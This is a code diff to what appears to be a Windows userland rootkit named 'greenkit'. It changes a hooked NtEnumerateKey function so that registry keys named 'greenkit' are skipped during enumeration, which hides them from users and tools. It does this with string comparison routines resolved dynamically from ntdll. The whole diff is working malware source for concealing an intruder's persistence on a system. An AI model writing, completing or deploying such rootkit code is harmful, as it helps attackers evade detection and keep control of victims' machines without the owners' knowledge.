@@ -68,14 +68,62 @@ typedef NTSTATUS(NTAPI *TD_NtOpenKey)(
 TD_NtEnumerateKey oldNtEnumerateKey;
 TD_NtEnumerateKey hookNtEnumerateKey;
 
+typedef LONG (WINAPI *RtlCompareUnicodeString)(
+    _In_ PCUNICODE_STRING String1,
+    _In_ PCUNICODE_STRING String2,
+    _In_ BOOLEAN          CaseInSensitive
+    );
+
+typedef NTSTATUS(WINAPI * TD_RtlAnsiStringToUnicodeString)(
+    _Inout_ PUNICODE_STRING DestinationString,
+    _In_    PCANSI_STRING   SourceString,
+    _In_    BOOLEAN         AllocateDestinationString
+    );
+
 BOOL mustShiftReg(UNICODE_STRING uStr_reg) {
-    if (wcscmp((uStr_reg.Buffer), L"greenkit") <= 0)
+    UNICODE_STRING abc;
+    ANSI_STRING ansi_abc;
+    ansi_abc.Buffer = "greenkit";
+    ansi_abc.Length = 8;
+    ansi_abc.MaximumLength = 1024;
+    TD_RtlAnsiStringToUnicodeString ansi_to_uni = (NTSTATUS(WINAPI *)
+        (_Inout_ PUNICODE_STRING DestinationString, _In_ PCANSI_STRING SourceString,
+        _In_ BOOLEAN AllocateDestinationString))GetProcAddress(GetModuleHandle("ntdll.dll"),
+        "RtlAnsiStringToUnicodeString");
+
+    ansi_to_uni(&abc, &ansi_abc, TRUE);
+
+    RtlCompareUnicodeString compare_uni = (LONG(WINAPI*)
+        (_In_ PCUNICODE_STRING String1,
+        _In_ PCUNICODE_STRING String2,
+        _In_ BOOLEAN          CaseInSensitive
+        ))GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCompareUnicodeString");
+    if (compare_uni(&abc, &uStr_reg, true) <= 0)
         return TRUE;
     return FALSE;
 }
 
 BOOL mustHideReg(UNICODE_STRING uStr_reg) {
-    if (wcscmp(uStr_reg.Buffer, L"greenkit") == 0)
+
+    UNICODE_STRING abc;
+    ANSI_STRING ansi_abc;
+    ansi_abc.Buffer = "greenkit";
+    ansi_abc.Length = 8;
+    ansi_abc.MaximumLength = 1024;
+    TD_RtlAnsiStringToUnicodeString ansi_to_uni = (NTSTATUS(WINAPI *)
+        (_Inout_ PUNICODE_STRING DestinationString, _In_ PCANSI_STRING SourceString,
+        _In_ BOOLEAN AllocateDestinationString))GetProcAddress(GetModuleHandle("ntdll.dll"),
+        "RtlAnsiStringToUnicodeString");
+
+    ansi_to_uni(&abc, &ansi_abc, TRUE);
+
+    RtlCompareUnicodeString compare_uni = (LONG(WINAPI*)
+        (_In_ PCUNICODE_STRING String1,
+        _In_ PCUNICODE_STRING String2,
+        _In_ BOOLEAN          CaseInSensitive
+        ))GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCompareUnicodeString");
+
+    if (compare_uni(&abc, &uStr_reg, true) == 0)
         return TRUE;
     return FALSE;
 }
@@ -106,48 +154,60 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 {
     NTSTATUS ret;
     UNICODE_STRING uStr_tmp;
+    UNICODE_STRING abc;
+    ANSI_STRING ansi_abc;
+    ansi_abc.Buffer = "greenkit";
+    ansi_abc.Length = 8;
+    ansi_abc.MaximumLength = 1024;
+    TD_RtlAnsiStringToUnicodeString ansi_to_uni = (NTSTATUS(WINAPI *)
+        (_Inout_ PUNICODE_STRING DestinationString, _In_ PCANSI_STRING SourceString,
+        _In_ BOOLEAN AllocateDestinationString))GetProcAddress(GetModuleHandle("ntdll.dll"),
+        "RtlAnsiStringToUnicodeString");
+
+    ansi_to_uni(&abc, &ansi_abc, TRUE);
+
     ULONG tmpIndex = Index;
-	ULONG tmpInt = 0;
+    ULONG tmpInt = 0;
     HANDLE h_tmp;
     OBJECT_ATTRIBUTES ObjectAttributes;
 
-	if (KeyInformationClass == KeyBasicInformation || KeyInformationClass == KeyNodeInformation) {
-		ret = hookNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
-		if (NT_SUCCESS(ret)) {
-			uStr_tmp.Buffer = (PWSTR)getKeyName(KeyInformation, KeyInformationClass);
-			uStr_tmp.Length = (USHORT)getKeyNameLength(KeyInformation, KeyInformationClass);
+    if (KeyInformationClass == KeyBasicInformation || KeyInformationClass == KeyNodeInformation) {
+        ret = hookNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
+        if (NT_SUCCESS(ret)) {
+            uStr_tmp.Buffer = (PWSTR)getKeyName(KeyInformation, KeyInformationClass);
+            uStr_tmp.Length = (USHORT)getKeyNameLength(KeyInformation, KeyInformationClass);
 
-			if (mustShiftReg(uStr_tmp)) { // TODO change this part for more than one key to hide {
-				TD_NtOpenKey _NtOpenKey = (TD_NtOpenKey)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenKey");
-				NTSTATUS status;
-				InitializeObjectAttributes(&ObjectAttributes, &uStr_tmp, 0, KeyHandle, NULL);
-				if (NT_SUCCESS(_NtOpenKey(&h_tmp, GENERIC_READ, &ObjectAttributes))) {
-					++tmpIndex;
-					CloseHandle(h_tmp);
-				}
-			}
+            if (mustShiftReg(uStr_tmp)) { // TODO change this part for more than one key to hide {
+                TD_NtOpenKey _NtOpenKey = (TD_NtOpenKey)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenKey");
+                NTSTATUS status;
+                InitializeObjectAttributes(&ObjectAttributes, &abc, 0, KeyHandle, NULL);
+                if (NT_SUCCESS(_NtOpenKey(&h_tmp, GENERIC_READ, &ObjectAttributes))) {
+                    ++tmpIndex;
+                    CloseHandle(h_tmp);
+                }
+            }
 
-			if (tmpIndex != Index) {
-				ret = hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
-				if (ret != STATUS_SUCCESS)
-					return ret;
-				if (mustHideReg(uStr_tmp))
-					++tmpIndex;
-			}
+            if (tmpIndex != Index) {
+                ret = hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
+                if (ret != STATUS_SUCCESS)
+                    return ret;
+                if (mustHideReg(uStr_tmp))
+                    ++tmpIndex;
+            }
 
-			do {
-				ret = hookNtEnumerateKey(KeyHandle, tmpIndex++, KeyInformationClass, KeyInformation, Length, ResultLength);
-				if (ret != STATUS_SUCCESS)
-					return ret;
-				if (!mustHideReg(uStr_tmp))
-					break;
-				else
-					++tmpInt;
-			} while (TRUE);
-		}
-
-		return hookNtEnumerateKey(KeyHandle, Index + tmpInt, KeyInformationClass, KeyInformation, Length, ResultLength);
-	}
+            do {
+                ret = hookNtEnumerateKey(KeyHandle, tmpIndex++, KeyInformationClass, KeyInformation, Length, ResultLength);
+                if (ret != STATUS_SUCCESS)
+                    return ret;
+                if (!mustHideReg(uStr_tmp))
+                    break;
+                else
+                    ++tmpInt;
+            } while (TRUE);
+        }
+    }
+    return hookNtEnumerateKey(KeyHandle, Index + tmpInt, KeyInformationClass, KeyInformation, Length, ResultLength);
+}
 
 	BOOL APIENTRY DllMain(HMODULE hModule,
 		DWORD  ul_reason_for_call,
